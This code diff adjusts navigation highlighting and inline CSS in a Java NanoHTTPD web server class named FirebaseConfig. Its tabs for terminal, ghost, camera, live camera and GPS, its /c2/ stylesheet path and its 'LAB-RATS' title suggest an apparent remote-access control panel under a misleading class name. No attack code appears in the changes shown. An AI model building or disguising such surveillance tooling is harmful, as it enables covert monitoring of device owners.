@@ -202,7 +202,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
     private String getHeader(String uri) {
         // Navigation Map
-        String homeActive = (uri.equals("/") || uri.equals("/terminal")) ? "active" : "";
+        String homeActive = (uri == null || uri.equals("/") || uri.equals("/terminal") || uri.isEmpty() || uri.trim().isEmpty()) ? "active" : "";
         String ghostActive = uri.startsWith("/ghost") ? "active" : "";
         String cameraActive = (uri.startsWith("/camera") || uri.startsWith("/camera/live")) ? "active" : "";
         String gpsActive = uri.startsWith("/gps") ? "active" : "";
@@ -244,6 +244,7 @@ public class FirebaseConfig extends NanoHTTPD {
             "<title>LAB-RATS | CORE</title>" +
             "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<link rel=\"stylesheet\" href=\"/c2/style.css?v=" + System.currentTimeMillis() + "\">" +
+            "<style>.nav a.active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 35px #00f2ff, inset 0 0 15px rgba(0,0,0,0.4) !important; font-weight: 900 !important; transform: scale(1.04); } @media (min-width: 1024px) { body { zoom: 0.9; } }</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
